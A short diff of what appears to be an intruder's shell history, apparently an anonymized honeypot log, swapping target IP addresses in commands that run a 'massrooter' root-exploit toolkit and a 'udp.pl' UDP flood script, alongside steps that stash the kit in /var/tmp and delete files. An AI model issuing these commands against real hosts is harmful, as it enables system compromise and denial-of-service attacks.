@@ -43,7 +43,7 @@ ls -a
 rm -rf massrooter.tgz 
 ls -a
 cd massrooter/
-./r00t 225.31.100.4 -d 4
+./r00t 99.1.42.210 -d 4
 cd ..
 ls -a
 mv massrooter/ /var/tmp
@@ -67,7 +67,7 @@ cd ..
 rm -rf massrooter/
 ls -a
 cd udp.pl
-perl udp.pl 233.98.174.54 0 99999999999999999999999999999999999
+perl udp.pl 62.31.127.15 0 99999999999999999999999999999999999
 ls -a
 cd binpkgs 
 ls -a
